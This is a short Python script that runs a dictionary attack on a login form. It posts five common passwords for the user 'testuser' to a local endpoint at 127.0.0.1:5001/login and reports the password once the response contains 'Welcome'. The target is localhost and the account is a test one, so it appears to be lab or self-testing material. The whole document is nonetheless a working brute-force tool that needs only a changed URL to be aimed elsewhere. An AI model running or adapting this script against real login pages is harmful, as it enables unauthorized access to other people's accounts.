import requests

url = "http://127.0.0.1:5001/login"
username = "testuser"
passwords = ["123456", "password", "admin", "test123", "letmein"]

for pwd in passwords:
    data = {"username": username, "password": pwd}
    response = requests.post(url, data=data)
    print(f"Trying password: {pwd} | Status: {response.status_code}")
    if "Welcome" in response.text:
        print(f"Password found: {pwd}")
        break
